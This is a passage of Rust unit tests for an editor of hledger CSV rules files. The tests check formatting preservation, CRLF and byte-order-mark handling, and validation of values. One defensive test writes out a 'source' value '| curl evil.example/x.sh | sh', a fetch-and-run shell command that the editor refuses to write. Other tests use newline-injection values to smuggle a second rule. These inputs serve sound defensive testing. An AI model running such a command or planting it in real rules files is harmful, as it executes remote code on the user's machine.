                vec![assign(account(2), "expenses:x")],
            )),
            "if %description A\n& B\nC\n    account2 expenses:x\n\n"
        );
    }

    #[test]
    fn an_empty_or_group_is_refused_rather_than_silently_dropped() {
        // Flattening would make it vanish and re-group its neighbours, and the
        // bare `&` line it would otherwise be is a file hledger rejects.
        let doc = parsed(GROUPED);
        let error = doc
            .apply(&EditPlan {
                order: vec![Slot::Replace(
                    ItemId(0),
                    grouped_block(
                        vec![vec![whole("A")], vec![]],
                        vec![assign(account(2), "expenses:x")],
                    ),
                )],
                delete: Vec::new(),
            })
            .expect_err("an empty group is not writable");
        assert!(
            invalid_message(&error).contains("OR-group needs at least one matcher"),
            "{error:?}"
        );
    }

    #[test]
    fn an_added_if_block_assignment_uses_the_blocks_own_indent_and_one_space() {
        // Four spaces because that is this block's indent, and a single space
        // between field and value because there is no column to align to yet.
        let doc = parsed(BLOCK);
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![whole("ACME PAYROLL"), whole("COSTCO")],
                    vec![
                        assign(account(2), "income:salary"),
                        assign(HledgerField::Comment, "monthly pay"),
                        assign(HledgerField::Currency, "USD"),
                    ],
                ),
            ),
            "if ACME PAYROLL\nCOSTCO\n    account2  income:salary\n    comment   monthly pay\n    currency USD\n"
        );

        // A tab-indented block keeps its tab, faithfully.
        let doc = parsed("if FOO\n\taccount2\tx\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![whole("FOO")],
                    vec![assign(account(2), "x"), assign(HledgerField::Comment, "y")],
                ),
            ),
            "if FOO\n\taccount2\tx\n\tcomment y\n"
        );
    }

    #[test]
    fn a_removed_if_block_matcher_or_assignment_drops_its_whole_line() {
        let doc = parsed(BLOCK);
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![whole("ACME PAYROLL")],
                    vec![assign(account(2), "income:salary")],
                ),
            ),
            "if ACME PAYROLL\n    account2  income:salary\n"
        );
    }

    #[test]
    fn an_if_blocks_layout_is_preserved_as_found_even_when_the_matchers_change() {
        // Stacked stays stacked: the bare `if` header is not rewritten into an
        // inline one just because the first matcher changed.
        let doc = parsed("if\nCOFFEE\nPEETS\n  account2  expenses:coffee\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![whole("COFFEE"), whole("PEETS"), whole("STARBUCKS")],
                    vec![assign(account(2), "expenses:coffee")],
                ),
            ),
            "if\nCOFFEE\nPEETS\nSTARBUCKS\n  account2  expenses:coffee\n"
        );

        // ...and inline stays inline, with the added matcher below the header.
        let doc = parsed("if COFFEE\n  account2  expenses:coffee\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![whole("COFFEE"), whole("PEETS")],
                    vec![assign(account(2), "expenses:coffee")],
                ),
            ),
            "if COFFEE\nPEETS\n  account2  expenses:coffee\n"
        );
    }

    #[test]
    fn a_field_scoped_matcher_edit_reuses_the_gap_after_the_field_name() {
        let doc = parsed("if %description   COFFEE HOUSE\n  account2  x\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![scoped("note", "COFFEE HOUSE")],
                    vec![assign(account(2), "x")],
                ),
            ),
            "if %note   COFFEE HOUSE\n  account2  x\n"
        );
        // Dropping the scope leaves a bare whole-record regex in its place.
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(vec![whole("COFFEE HOUSE")], vec![assign(account(2), "x")]),
            ),
            "if COFFEE HOUSE\n  account2  x\n"
        );
    }

    #[test]
    fn an_if_block_keeps_the_whitespace_only_lines_hledger_treats_as_no_ops() {
        let doc = parsed("if FOO\n  account2  a\n   \n  account3  b\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![whole("FOO")],
                    vec![assign(account(2), "a"), assign(account(3), "c")],
                ),
            ),
            "if FOO\n  account2  a\n   \n  account3  c\n"
        );
    }

    #[test]
    fn an_edit_never_touches_the_leading_comment_run_or_the_trailing_blank_run() {
        let doc =
            parsed("skip 1\n\n; why this rule exists\naccount2  expenses:unknown\n\n\nskip 2\n");
        assert_eq!(
            replaced(
                &doc,
                1,
                ItemBody::Assignment {
                    field: account(2),
                    value: "expenses:food".to_string(),
                },
            ),
            "skip 1\n\n; why this rule exists\naccount2  expenses:food\n\n\nskip 2\n"
        );
    }

    // -- the alignment test that matters -----------------------------------

    /// A file built with column-aligned values for exactly this purpose.
    const CREDITCARD: &str = include_str!("../../../fixtures/rules/simple/creditcard1.csv.rules");

    #[test]
    fn editing_one_value_leaves_every_other_line_and_its_own_alignment_untouched() {
        let doc = parsed(CREDITCARD);
        let at = doc
            .items()
            .iter()
            .find(|item| doc.text()[item.body.clone()].starts_with("account2 "))
            .expect("the fixture has a top-level account2");

        let out = replaced(
            &doc,
            at.id.0,
            ItemBody::Assignment {
                field: account(2),
                value: "expenses:groceries".to_string(),
            },
        );

        // The changed line keeps its six-space separator: the value column did
        // not move, because nothing re-derived it.
        assert!(
            out.contains("account2      expenses:groceries\n"),
            "the separator was not reused verbatim: {out:?}"
        );
        // And the file is otherwise the file, line for line.
        assert_eq!(
            out,
            CREDITCARD.replace(
                "account2      expenses:unknown",
                "account2      expenses:groceries"
            )
        );
        let changed = out
            .lines()
            .zip(CREDITCARD.lines())
            .filter(|(after, before)| after != before)
            .count();
        assert_eq!(changed, 1, "exactly one line may differ");
    }

    // -- render then parse: the fixpoint for every `ItemBody` --------------

    #[test]
    fn a_rendered_directive_parses_back_to_the_directive_it_was_given() {
        for (name, value) in [
            (
                DirectiveName::DateFormat,
                DirectiveValue::Text("%Y-%m-%d".to_string()),
            ),
            (
                DirectiveName::Separator,
                DirectiveValue::Separator(Separator::Tab {
                    raw: "TAB".to_string(),
                }),
            ),
            (DirectiveName::Skip, DirectiveValue::Skip(3)),
            (
                DirectiveName::BalanceType,
                DirectiveValue::BalanceType(BalanceType::TotalInclusive),
            ),
            (DirectiveName::DecimalMark, DirectiveValue::DecimalMark(',')),
            (DirectiveName::NewestFirst, DirectiveValue::Flag),
        ] {
            let text = inserted(ItemBody::Directive {
                name,
                value: value.clone(),
            });
            let doc = parsed(&text);
            let ItemKind::Directive(parsed) = only(&doc) else {
                panic!("{text:?} should be a directive")
            };
            assert_eq!((parsed.name, &parsed.value), (name, &value), "{text:?}");
        }
    }

    #[test]
    fn a_rendered_fields_list_parses_back_to_the_names_it_was_given() {
        let names = ["date", "", "description", "amount-in"]
            .map(String::from)
            .to_vec();
        let text = inserted(ItemBody::Fields {
            names: names.clone(),
        });
        assert_eq!(text, "fields date, , description, amount-in\n");
        let doc = parsed(&text);
        let ItemKind::Fields(fields) = only(&doc) else {
            panic!("{text:?} should be a fields list")
        };
        assert_eq!(fields.names, names);
    }

    #[test]
    fn a_rendered_assignment_parses_back_to_the_field_and_value_it_was_given() {
        for (field, value) in [
            (account(2), "expenses:food:coffee"),
            (HledgerField::Comment, "paid ; not a comment"),
            (HledgerField::Date, ""),
        ] {
            let text = inserted(ItemBody::Assignment {
                field,
                value: value.to_string(),
            });
            let doc = parsed(&text);
            let ItemKind::Assignment(parsed) = only(&doc) else {
                panic!("{text:?} should be an assignment")
            };
            assert_eq!(parsed.field, field, "{text:?}");
            assert_eq!(at(&doc, &parsed.value_span), value, "{text:?}");
        }
    }

    #[test]
    fn a_rendered_if_block_parses_back_to_the_block_it_was_given() {
        let specs = vec![scoped("description", "COFFEE"), whole("PEETS")];
        let assignments = vec![
            assign(account(2), "expenses:food:coffee"),
            assign(HledgerField::Comment, "caffeine"),
        ];
        let text = inserted(block_of(specs.clone(), assignments.clone()));
        assert_eq!(
            text,
            "if %description COFFEE\nPEETS\n    account2 expenses:food:coffee\n    comment caffeine\n\n"
        );

        let doc = parsed(&text);
        let ItemKind::IfBlock(block) = only(&doc) else {
            panic!("{text:?} should be an editable conditional block")
        };
        assert_eq!(block.layout, IfLayout::Inline);
        assert_eq!(
            matchers(block)
                .map(|matcher| MatcherSpec {
                    scope: matcher.scope.clone(),
                    pattern: matcher.pattern.clone(),
                })
                .collect::<Vec<_>>(),
            specs
        );
        assert_eq!(
            block
                .assignments
                .iter()
                .map(|assignment| (
                    assignment.field,
                    at(&doc, &assignment.value_span).to_string()
                ))
                .collect::<Vec<_>>(),
            assignments
        );
    }

    #[test]
    fn an_inserted_conditional_block_is_the_only_thing_that_gets_a_blank_line() {
        // Required, not decorative: the neighbour below may be a conditional
        // table, whose extent runs to the first blank line.
        assert!(
            inserted(block_of(vec![whole("FOO")], vec![assign(account(2), "x")]))
                .ends_with("x\n\n")
        );
        assert_eq!(
            inserted(ItemBody::Assignment {
                field: account(2),
                value: "x".to_string(),
            }),
            "account2 x\n"
        );
    }

    #[test]
    fn a_crlf_block_edit_keeps_every_carriage_return() {
        // The terminator is per-line here, spliced from `line.end`, so a CRLF
        // file must not acquire a lone LF anywhere — including on the line the
        // edit added, which the renderer writes rather than copies.
        let doc = parsed("if COFFEE\r\n  account2  expenses:coffee\r\n");
        let out = replaced(
            &doc,
            0,
            block_of(
                vec![whole("COFFEE"), whole("PEETS")],
                vec![
                    assign(account(2), "expenses:food:coffee"),
                    assign(HledgerField::Comment, "caffeine"),
                ],
            ),
        );
        assert_eq!(
            out,
            "if COFFEE\r\nPEETS\r\n  account2  expenses:food:coffee\r\n  comment caffeine\r\n"
        );
        assert_eq!(
            out.matches('\n').count(),
            out.matches("\r\n").count(),
            "no line may have lost its carriage return"
        );
    }

    #[test]
    fn an_insert_into_a_crlf_document_writes_crlf() {
        let doc = parsed("skip 1\r\n");
        let plan = EditPlan {
            order: vec![
                Slot::Keep(ItemId(0)),
                Slot::Insert(ItemBody::Assignment {
                    field: account(2),
                    value: "expenses:unknown".to_string(),
                }),
            ],
            delete: Vec::new(),
        };
        let out = doc.apply(&plan).expect("the insert renders");
        assert_eq!(out, "skip 1\r\naccount2 expenses:unknown\r\n");
        assert_eq!(doc.verify(&plan, &out), Ok(()));
    }

    #[test]
    fn an_insert_at_the_end_of_a_file_with_no_final_newline_terminates_the_line_first() {
        let doc = parsed("skip 1");
        let plan = EditPlan {
            order: vec![
                Slot::Keep(ItemId(0)),
                Slot::Insert(ItemBody::Assignment {
                    field: account(2),
                    value: "expenses:unknown".to_string(),
                }),
            ],
            delete: Vec::new(),
        };
        let out = doc.apply(&plan).expect("the insert renders");
        assert_eq!(out, "skip 1\naccount2 expenses:unknown\n");
        assert_eq!(doc.verify(&plan, &out), Ok(()));
    }

    #[test]
    fn the_reorder_a_missing_final_newline_used_to_refuse_now_succeeds() {
        // Step 2 correctly refused this: the last item had no terminator, so
        // moving it inland glued it to its successor. The renderer now supplies
        // the terminator, and the reorder verifies.
        let text = "skip 1\nfields date, amount\naccount2 expenses:unknown";
        let doc = parsed(text);
        assert_eq!(doc.items().len(), 3);
        let plan = EditPlan {
            order: vec![
                Slot::Keep(ItemId(0)),
                Slot::Keep(ItemId(2)),
                Slot::Keep(ItemId(1)),
            ],
            delete: Vec::new(),
        };
        let out = doc.apply(&plan).expect("the reorder renders");
        assert_eq!(
            out,
            "skip 1\naccount2 expenses:unknown\nfields date, amount\n"
        );
        assert_eq!(doc.verify(&plan, &out), Ok(()));
        // Nothing is supplied when it is not needed: the identity plan is still
        // byte-for-byte the original, terminator-less ending included.
        assert_eq!(doc.apply(&EditPlan::keep_all(&doc)).as_deref(), Ok(text));
    }

    // -- the edit policy ---------------------------------------------------

    #[test]
    fn trivia_and_opaque_items_can_be_kept_but_never_rewritten() {
        let doc = parsed("; a note\n\nif,a,b\nX,Y\n");
        assert_eq!(
            shapes(&doc),
            vec![Shape::Trivia, Shape::Opaque(OpaqueReason::IfTable)]
        );
        for at in [0, 1] {
            let error = replace_error(
                &doc,
                at,
                ItemBody::Assignment {
                    field: account(2),
                    value: "x".to_string(),
                },
            );
            assert!(
                matches!(error, RulesError::NotEditable { id, .. } if id == Some(ItemId(at))),
                "item {at}: {error:?}"
            );
        }
    }

    #[test]
    fn an_include_can_be_kept_but_never_rewritten() {
        let doc = parsed("include ../common.rules\n");
        let error = replace_error(
            &doc,
            0,
            ItemBody::Assignment {
                field: account(2),
                value: "x".to_string(),
            },
        );
        assert!(matches!(error, RulesError::NotEditable { .. }), "{error:?}");
        // ...and there is no `ItemBody` that can express one, so an insert is
        // impossible by construction rather than by rule.
    }

    #[test]
    fn source_and_archive_can_be_kept_but_never_written() {
        // The single most important restriction here: `source` accepts `| CMD`,
        // which hledger runs through the shell on the next `import`.
        let doc = parsed("source bank/*.csv\narchive\n");
        for at in [0, 1] {
            let error = replace_error(
                &doc,
                at,
                ItemBody::Directive {
                    name: DirectiveName::Encoding,
                    value: DirectiveValue::Text("utf8".to_string()),
                },
            );
            assert!(matches!(error, RulesError::NotEditable { .. }), "{error:?}");
        }

        for name in [DirectiveName::Source, DirectiveName::Archive] {
            let error = insert_error(ItemBody::Directive {
                name,
                value: DirectiveValue::Source {
                    raw: "| curl evil.example/x.sh | sh".to_string(),
                    has_command: true,
                },
            });
            let RulesError::NotEditable { id, why } = &error else {
                panic!("{name:?}: {error:?}")
            };
            assert_eq!(*id, None);
            assert!(why.contains(directive_keyword(name)), "{why}");
        }
    }

    #[test]
    fn deleting_a_source_line_is_still_allowed() {
        // Removing a line cannot inject anything, so the policy does not reach
        // it — only writing one is refused.
        let doc = parsed("source bank/*.csv\nskip 1\n");
        let plan = EditPlan {
            order: vec![Slot::Keep(ItemId(1))],
            delete: vec![ItemId(0)],
        };
        assert_eq!(doc.apply(&plan).as_deref(), Ok("skip 1\n"));
    }

    #[test]
    fn every_other_construct_may_be_replaced_and_inserted() {
        let doc = parsed("skip 1\nfields date, amount\naccount2 x\nif FOO\n  account2 y\n");
        let bodies = [
            ItemBody::Directive {
                name: DirectiveName::Skip,
                value: DirectiveValue::Skip(2),
            },
            ItemBody::Fields {
                names: ["date", "description"].map(String::from).to_vec(),
            },
            ItemBody::Assignment {
                field: account(3),
                value: "z".to_string(),
            },
            block_of(vec![whole("BAR")], vec![assign(account(2), "y")]),
        ];
        for (at, body) in bodies.into_iter().enumerate() {
            let at = u32::try_from(at).expect("small");
            // Replaceable...
            let _ = replaced(&doc, at, body.clone());
            // ...and insertable.
            let _ = inserted(body);
        }
    }

    // -- the byte-order-mark guard -----------------------------------------

    #[test]
    fn a_byte_order_marked_document_refuses_to_let_its_first_item_move() {
        let doc = parsed("\u{feff}skip 1\nfields date, amount\n");
        assert_eq!(doc.items().len(), 2);
        let moved = EditPlan {
            order: vec![Slot::Keep(ItemId(1)), Slot::Keep(ItemId(0))],
            delete: Vec::new(),
        };
        assert_eq!(doc.apply(&moved), Err(RulesError::BomMustLeadDocument));

        // An insert in front of it is the same corruption by another name.
        let pushed = EditPlan {
            order: vec![
                Slot::Insert(ItemBody::Assignment {
                    field: account(2),
                    value: "x".to_string(),
                }),
                Slot::Keep(ItemId(0)),
                Slot::Keep(ItemId(1)),
            ],
            delete: Vec::new(),
        };
        assert_eq!(doc.apply(&pushed), Err(RulesError::BomMustLeadDocument));

        // Keeping it first is fine, and so is deleting it: deleting takes the
        // mark out of the file rather than burying it inside.
        assert!(doc.apply(&EditPlan::keep_all(&doc)).is_ok());
        assert_eq!(
            doc.apply(&EditPlan {
                order: vec![Slot::Keep(ItemId(1))],
                delete: vec![ItemId(0)],
            })
            .as_deref(),
            Ok("fields date, amount\n")
        );
    }

    #[test]
    fn a_document_without_a_byte_order_mark_reorders_freely() {
        let doc = parsed("skip 1\nfields date, amount\n");
        let plan = EditPlan {
            order: vec![Slot::Keep(ItemId(1)), Slot::Keep(ItemId(0))],
            delete: Vec::new(),
        };
        assert_eq!(
            doc.apply(&plan).as_deref(),
            Ok("fields date, amount\nskip 1\n")
        );
    }

    // -- value validation: one test per rejection --------------------------

    #[test]
    fn a_control_character_in_a_value_is_refused() {
        // A newline is how one would smuggle a second rule into a one-line item.
        for value in ["expenses:food\nskip 1", "a\rb", "a\tb", "a\u{0}b"] {
            let error = insert_error(ItemBody::Assignment {
                field: account(2),
                value: value.to_string(),
            });
            assert!(
                invalid_message(&error).contains("control character"),
                "{value:?}: {error:?}"
            );
        }
    }

    #[test]
    fn a_control_character_in_a_matcher_pattern_is_refused() {
        let error = insert_error(block_of(
            vec![whole("FOO\n  account2 evil")],
            vec![assign(account(2), "x")],
        ));
        assert!(invalid_message(&error).contains("control character"));
    }

    #[test]
    fn an_over_long_value_is_refused() {
        let error = insert_error(ItemBody::Assignment {
            field: account(2),
            value: "x".repeat(MAX_VALUE_BYTES + 1),
        });
        assert!(invalid_message(&error).contains("the limit is 512"));
    }

    #[test]
    fn an_over_long_field_name_is_refused() {
        let error = insert_error(ItemBody::Fields {
            names: vec!["date".to_string(), "x".repeat(MAX_NAME_BYTES + 1)],
        });
        assert!(invalid_message(&error).contains("the limit is 64"));
    }

    #[test]
    fn an_over_long_matcher_pattern_is_refused() {
        let error = insert_error(block_of(
            vec![whole(&"x".repeat(MAX_PATTERN_BYTES + 1))],
            vec![assign(account(2), "y")],
        ));
        assert!(invalid_message(&error).contains("the limit is 256"));
    }

    #[test]
    fn a_backreference_in_an_assignment_value_is_refused() {
        // There is no capture group for it to refer to — an editable block has
        // none by construction — and hledger errors on it at read time.
        let error = insert_error(ItemBody::Assignment {
            field: HledgerField::Comment,
            value: "period \\1".to_string(),
        });
        assert!(invalid_message(&error).contains("backreference"));
    }

    #[test]
    fn a_backreference_in_a_matcher_pattern_is_refused() {
        let error = insert_error(block_of(
            vec![whole("A\\1B")],
            vec![assign(account(2), "x")],
        ));
        assert!(invalid_message(&error).contains("backreference"));
    }

    #[test]
    fn an_empty_matcher_pattern_is_refused() {
        let error = insert_error(block_of(vec![whole("")], vec![assign(account(2), "x")]));
        assert!(invalid_message(&error).contains("may not be empty"));
    }

    #[test]
    fn a_whitespace_led_matcher_pattern_is_refused() {
        // hledger's `regexp` opens with `nonspace`.
        let error = insert_error(block_of(vec![whole(" FOO")], vec![assign(account(2), "x")]));
        assert!(invalid_message(&error).contains("may not start with whitespace"));
    }

    #[test]
    fn a_combinator_led_matcher_pattern_is_refused() {
        for pattern in ["& FOO", "&& FOO", "! FOO"] {
            let error = insert_error(block_of(
                vec![whole(pattern)],
                vec![assign(account(2), "x")],
            ));
            let message = invalid_message(&error);
            assert!(
                message.contains("`&` or `!`") || message.contains("joins two matchers"),
                "{pattern:?}: {message}"
            );
        }
    }

    #[test]
    fn a_comment_like_matcher_pattern_is_refused() {
        for pattern in [";FOO", "#FOO", "*FOO"] {
            let error = insert_error(block_of(
                vec![whole(pattern)],
                vec![assign(account(2), "x")],
            ));
            assert!(
                invalid_message(&error).contains("rather than a comment"),
                "{pattern:?}"
            );
        }
    }

    #[test]
    fn a_double_ampersand_inside_a_matcher_pattern_is_refused() {
        let error = insert_error(block_of(
            vec![whole("FOO && BAR")],
            vec![assign(account(2), "x")],
        ));
        assert!(invalid_message(&error).contains("joins two matchers"));
    }

    #[test]
    fn an_unescaped_paren_in_a_matcher_pattern_is_refused() {
        let error = insert_error(block_of(
            vec![whole("(....-..)")],
            vec![assign(account(2), "x")],
        ));
        assert!(invalid_message(&error).contains("unescaped `(`"));
    }

    #[test]
    fn a_whole_record_pattern_that_reads_as_a_field_matcher_is_refused() {
        // hledger's `try fieldmatcherp <|> recordmatcherp` would scope it to
        // `description`, matching something narrower than was asked for.
        let error = insert_error(block_of(
            vec![whole("%description COFFEE")],
            vec![assign(account(2), "x")],
        ));
        assert!(invalid_message(&error).contains("%FIELD PATTERN"));
    }

    #[test]
    fn a_matcher_scope_name_that_is_not_a_bare_name_is_refused() {
        for field in ["", "my field", "note;x", "café"] {
            let error = insert_error(block_of(
                vec![scoped(field, "FOO")],
                vec![assign(account(2), "x")],
            ));
            assert!(
                invalid_message(&error).contains("A-Z, a-z, 0-9"),
                "{field:?}: {error:?}"
            );
        }
        // A bare column number is a scope name hledger accepts, and so does this.
        assert_eq!(
            inserted(block_of(
                vec![scoped("3", "FOO")],
                vec![assign(account(2), "x")]
            )),
            "if %3 FOO\n    account2 x\n\n"
        );
    }

    #[test]
    fn a_fields_list_shorter_than_two_names_is_refused() {
        // hledger rejects a one-name list outright — verified against the binary.
        for names in [vec![], vec!["date".to_string()]] {
            let error = insert_error(ItemBody::Fields { names });
            assert!(invalid_message(&error).contains("at least two names"));
        }
    }

    #[test]
    fn a_fields_name_that_is_not_bare_is_refused() {
        for name in ["a,b", "a b", "a;b", "a#b"] {
            let error = insert_error(ItemBody::Fields {
                names: vec!["date".to_string(), name.to_string()],
            });
            assert!(
                invalid_message(&error).contains("A-Z, a-z, 0-9"),
                "{name:?}: {error:?}"
            );
        }
    }

    #[test]
    fn a_directive_whose_rendering_does_not_read_back_is_refused() {
        for (name, value) in [
            // `separator` reads one character or a word it knows.
            (
                DirectiveName::Separator,
                DirectiveValue::Separator(Separator::Tab {
                    raw: "tabby".to_string(),
                }),
            ),
            // A name/value pairing the classifier cannot produce.
            (DirectiveName::Skip, DirectiveValue::Text("abc".to_string())),
            (DirectiveName::Encoding, DirectiveValue::Skip(2)),
            // Leading whitespace is eaten by the separator, so it cannot survive.
            (
                DirectiveName::DateFormat,
                DirectiveValue::Text("  %Y".to_string()),
            ),
        ] {
            let error = insert_error(ItemBody::Directive { name, value });
            assert!(
                invalid_message(&error).contains("does not read back"),
                "{name:?}: {error:?}"
            );
        }
    }

    #[test]
    fn a_posting_number_outside_one_to_ninety_nine_is_refused() {
        // hledger's field-name list is built from `show <$> [1..99]`.
        for n in [0, 100] {
            let error = insert_error(ItemBody::Assignment {
                field: account(n),
                value: "x".to_string(),
            });
            assert!(invalid_message(&error).contains("1 to 99"), "{n}");
        }
    }

    #[test]
    fn skip_is_refused_as_an_assignment_field() {
        // At top level hledger reads it as the skip *directive*, so writing it
        // as an assignment would produce a construct nobody asked for.
        let error = insert_error(ItemBody::Assignment {
            field: HledgerField::Control(ControlField::Skip),
            value: "1".to_string(),
        });
        assert!(invalid_message(&error).contains("`skip` is a directive"));
    }

    #[test]
    fn end_is_refused_inside_a_conditional_block_but_allowed_at_top_level() {
        let error = insert_error(block_of(
            vec![whole("FOO")],
            vec![assign(HledgerField::Control(ControlField::End), "")],
        ));
        assert!(invalid_message(&error).contains("control flow"));

        assert_eq!(
            inserted(ItemBody::Assignment {
                field: HledgerField::Control(ControlField::End),
                value: String::new(),
            }),
            "end\n"
        );
    }

    #[test]
    fn a_conditional_block_with_no_matcher_or_no_assignment_is_refused() {
        let error = insert_error(block_of(vec![], vec![assign(account(2), "x")]));
        assert!(invalid_message(&error).contains("at least one matcher"));

        let error = insert_error(block_of(vec![whole("FOO")], vec![]));
        assert!(invalid_message(&error).contains("at least one assignment"));
    }

    // -- value validation: the ones that must be ACCEPTED ------------------

    #[test]
    fn an_escaped_paren_in_a_matcher_is_accepted() {
        // `\(` is a literal parenthesis: no group, so no backreference, so
        // nothing an edit could break. Regex validity beyond that is hledger's.
        assert_eq!(
            inserted(block_of(
                vec![scoped("description", "COFFEE\\(X")],
                vec![assign(account(2), "x")],
            )),
            "if %description COFFEE\\(X\n    account2 x\n\n"
        );
    }

    #[test]
    fn an_empty_assignment_value_is_accepted_and_renders_as_a_bare_field_name() {
        // hledger's `fieldassignmentp` permits `field` + EOL, meaning `""`.
        let doc = parsed("comment  paid\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Assignment {
                    field: HledgerField::Comment,
                    value: String::new(),
                },
            ),
            "comment\n"
        );
        // An unchanged empty value keeps whatever separator the file had:
        // preserving beats normalizing.
        let doc = parsed("comment:\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Assignment {
                    field: HledgerField::Comment,
                    value: String::new(),
                },
            ),
            "comment:\n"
        );
    }

    #[test]
    fn a_semicolon_inside_an_assignment_value_is_accepted() {
        // hledger's `fieldvalp` does no comment stripping, so this `;` is part
        // of the account comment rather than the start of one.
        let doc = parsed("comment  paid\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Assignment {
                    field: HledgerField::Comment,
                    value: "paid ; not a comment".to_string(),
                },
            ),
            "comment  paid ; not a comment\n"
        );
    }

    // -- the blank line a conditional table's extent needs ------------------

    /// A rules file whose LAST construct is a conditional table — the shape that
    /// made "add a rule" fail. `if,`-tables end at an empty line or at EOF, so
    /// this one's extent has no terminator to move with it.
    const TABLE_AT_EOF: &str = "skip 1\nfields date, description, amount\naccount1 assets:b\n\nif,account2\nCOFFEE,expenses:coffee\n";

    /// The block every append test adds: one whole-record matcher, one
    /// `account2`.
    fn appended_block() -> ItemBody {
        block_of(
            vec![whole("LATTE")],
            vec![assign(account(2), "expenses:coffee")],
        )
    }

    /// `doc` with `body` appended after every existing item.
    fn append(doc: &RulesDoc, body: ItemBody) -> (EditPlan, String) {
        let mut plan = EditPlan::keep_all(doc);
        plan.order.push(Slot::Insert(body));
        let out = doc.apply(&plan).expect("the append renders");
        (plan, out)
    }

    #[test]
    fn appending_a_rule_after_a_table_that_ends_the_file() {
        // The bug, exactly: the new block's lines re-parsed as further DATA ROWS
        // of the table above them, `verify` refused (rightly), and an ordinary
        // "add a rule" answered with an internal error. The renderer now closes
        // the table's extent first.
        let doc = parsed(TABLE_AT_EOF);
        let (plan, out) = append(&doc, appended_block());
        assert_eq!(
            out,
            "skip 1\nfields date, description, amount\naccount1 assets:b\n\n\
             if,account2\nCOFFEE,expenses:coffee\n\n\
             if LATTE\n    account2 expenses:coffee\n\n"
        );
        assert_eq!(doc.verify(&plan, &out), Ok(()));

        // The table's extent is what it was — header plus its one data row — and
        // the new block is an item of its own, editable rather than swallowed.
        let reparsed = parsed(&out);
        assert_eq!(
            shapes(&reparsed),
            vec![
                Shape::Directive,
                Shape::Fields,
                Shape::Assignment,
                Shape::Opaque(OpaqueReason::IfTable),
                Shape::IfBlock,
            ]
        );
        let table = &reparsed.items()[3];
        assert_eq!(
            &out[table.body.clone()],
            "if,account2\nCOFFEE,expenses:coffee\n",
            "the table's body must not have grown"
        );
        let ItemKind::IfBlock(block) = &reparsed.items()[4].kind else {
            panic!("the appended rule must re-parse as an editable block");
        };
        assert_eq!(patterns(block), [vec!["LATTE"]]);
        assert_eq!(block.assignments.len(), 1);
    }

    #[test]
    fn a_table_at_eof_with_no_final_newline_gets_both_terminators() {
        // The two supplied terminators compose: this table lacks a line
        // terminator AND the empty line its extent ends at, so it needs one of
        // each — and exactly one of each.
        let text = TABLE_AT_EOF
            .strip_suffix('\n')
            .expect("the fixture ends with a terminator");
        let doc = parsed(text);
        let (plan, out) = append(&doc, appended_block());
        assert!(
            out.contains("COFFEE,expenses:coffee\n\nif LATTE\n"),
            "one terminator and one blank line, not two of either: {out:?}"
        );
        assert_eq!(doc.verify(&plan, &out), Ok(()));
        assert_eq!(
            shapes(&parsed(&out)).last(),
            Some(&Shape::IfBlock),
            "the appended rule must not join the table"
        );
    }

    #[test]
    fn a_table_already_followed_by_a_blank_line_gets_no_second_one() {
        // The terminator is already in the table item's trailing blank run, so
        // the renderer must add nothing. A rule that "helpfully" added one
        // anyway would grow a blank line on every save of an untouched file.
        let text = "if,account2\nCOFFEE,expenses:coffee\n\nskip 1\n";
        let doc = parsed(text);
        let (plan, out) = append(&doc, appended_block());
        assert_eq!(
            out,
            "if,account2\nCOFFEE,expenses:coffee\n\nskip 1\nif LATTE\n    account2 expenses:coffee\n\n"
        );
        assert_eq!(doc.verify(&plan, &out), Ok(()));
        // And the identity plan over the same document is still byte-identical:
        // an item that already ends where it must is not rewritten.
        let keep = EditPlan::keep_all(&doc);
        assert_eq!(doc.apply(&keep).as_deref(), Ok(text));
    }

    #[test]
    fn the_blank_line_a_table_needs_is_supplied_in_the_files_own_terminator() {
        // A CRLF file stays CRLF, terminators this module synthesizes included —
        // an LF blank line dropped into a CRLF file would show as a changed line
        // in the user's diff, and is the classic way a "format-preserving"
        // editor stops preserving.
        let text = "if,account2\r\nCOFFEE,expenses:coffee\r\n";
        let doc = parsed(text);
        assert_eq!(doc.newline(), Newline::CrLf);
        let (plan, out) = append(&doc, appended_block());
        assert_eq!(
            out,
            "if,account2\r\nCOFFEE,expenses:coffee\r\n\r\n\
             if LATTE\r\n    account2 expenses:coffee\r\n\r\n"
        );
        assert_eq!(doc.verify(&plan, &out), Ok(()));
        assert!(!out.contains("\n\n"), "no bare LF may appear: {out:?}");
    }

    #[test]
    fn has_empty_line_asks_for_empty_rather_than_blank() {
        // The predicate `separate` gates on, over a slot's trailing run.
        // "Empty", not "blank": a whitespace-only line is one more table row, so
        // it terminates nothing — and a table whose blank line is followed by an
        // indented one is still terminated.
        assert!(has_empty_line("\n"));
        assert!(has_empty_line("\r\n"));
        assert!(has_empty_line("\n \n"));
        assert!(!has_empty_line(" \n"));
        assert!(!has_empty_line(""));
        assert!(!has_empty_line("  "));
    }

    // -- verify still refuses what it refused before ------------------------

    #[test]
    fn an_insert_after_a_table_gets_the_blank_line_the_table_needs() {
        // The inserted assignment is unindented, and the item above it is a
        // conditional TABLE with no terminating blank line — so without the
        // supplied separator the re-parse would read the new line as one of the
        // table's data rows. Every byte would be what the plan asked for, and
        // the meaning would not.
        let doc = parsed("if,%description,account2\nACME,income:salary\n");
        let plan = EditPlan {
            order: vec![
                Slot::Keep(ItemId(0)),
                Slot::Insert(ItemBody::Assignment {
                    field: account(2),
                    value: "expenses:unknown".to_string(),
                }),
            ],
            delete: Vec::new(),
        };
        let out = doc.apply(&plan).expect("the plan renders");
        assert_eq!(
            out,
            "if,%description,account2\nACME,income:salary\n\naccount2 expenses:unknown\n"
        );
        assert_eq!(doc.verify(&plan, &out), Ok(()));
        assert_eq!(
            shapes(&parsed(&out)),
            vec![Shape::Opaque(OpaqueReason::IfTable), Shape::Assignment]
        );
    }

    #[test]
    fn verify_rejects_text_that_is_not_what_the_edit_plan_renders() {
